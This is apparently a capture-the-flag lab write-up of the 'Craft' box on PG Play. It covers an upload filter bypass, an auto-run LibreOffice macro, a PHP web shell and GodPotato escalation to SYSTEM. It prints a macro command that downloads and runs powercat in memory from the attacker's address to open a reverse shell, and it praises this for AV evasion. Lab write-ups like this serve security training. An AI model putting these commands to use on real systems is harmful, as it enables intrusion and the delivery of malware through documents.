# Craft -- PG Play (write-up)

**Difficulty:** Medium
**Box:** Craft (PG Play)
**Author:** dkrxhn
**Date:** 2024-12-28

---

## TL;DR

### Upload function on a web app accepted ODT files. Embedded a malicious LibreOffice macro to get a reverse shell as apache. Uploaded a PHP shell to the webroot, then used GodPotato for SYSTEM.
---
## Target info

- Host: `192.168.198.169`
- Services discovered via nmap
---
## Enumeration

![Nmap results](images/craft-pgp_1.png)

![Nmap continued](images/craft-pgp_2.png)

![Web app](images/craft-pgp_3.png)

![More enumeration](images/craft-pgp_4.png)

![Upload function](images/craft-pgp_5.png)

---
## Initial access -- ODT macro

The upload function allows a null byte trick on `shell.php.odt` -- intercept in Burp, change name to `shell.php:.odt`. The shell shows up in `/uploads`. Tried every PHP revshell from revshells.com but **none worked**.

Wappalyzer identified Umbraco. PHP 8.0.7 should be vulnerable but **not working**.

Pivoted to malicious LibreOffice macro instead.

In LibreOffice: Tools > Macros > Organize Macros > Basic, select document > New > name module:

![Macro editor](images/craft-pgp_6.png)

Test macro to confirm execution:

```vb
Shell("cmd /c powershell iwr http://192.168.45.160/")
```

![Macro test](images/craft-pgp_7.png)

Save, close macro window. Then Tools > Customize:

![Customize dialog](images/craft-pgp_8.png)

Events tab > Open Document > Assign: Macro:

![Event assignment](images/craft-pgp_9.png)

Select the nested folder within the document, hit OK:

![Macro assigned](images/craft-pgp_10.png)

Uploaded the ODT and got a callback on the listener:

![Callback confirmed](images/craft-pgp_11.png)

Updated the macro with a full reverse shell using powercat:

![Updated macro](images/craft-pgp_12.png)

```vb
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.160/powercat.ps1');powercat -c 192.168.45.160 -p 135 -e powershell")
```

Reassigned the macro in Tools > Customize and uploaded again:

![Shell as apache](images/craft-pgp_13.png)

![Apache user confirmed](images/craft-pgp_14.png)

---
## Pivoting to PHP shell

![Enumeration](images/craft-pgp_15.png)

![Webroot access](images/craft-pgp_16.png)

![More enumeration](images/craft-pgp_17.png)

![Service info](images/craft-pgp_18.png)

Uploaded a PHP reverse shell to the webroot at `C:\xampp\htdocs`:

![Upload to webroot](images/craft-pgp_19.png)

Set up listener and navigated to `192.168.198.169/new-shell.php` to trigger:

![PHP shell](images/craft-pgp_20.png)

---
## Privilege escalation -- GodPotato

JuicyPotatoNG **did not** work. Ran GodPotato-NET4.exe instead:

![GodPotato execution](images/craft-pgp_21.png)

```bash
rlwrap nc -lvnp 8082
```

![SYSTEM shell](images/craft-pgp_22.png)

Weird output from `whoami` but still able to get the flag:

![Flag](images/craft-pgp_23.png)

---
## Lessons & takeaways

- When direct PHP upload fails, pivot to macro-based document attacks
- LibreOffice macros with Open Document event triggers can execute on file open
- Powercat loaded via IEX never touches disk -- good for AV evasion
- When JuicyPotato fails, try GodPotato as an alternative
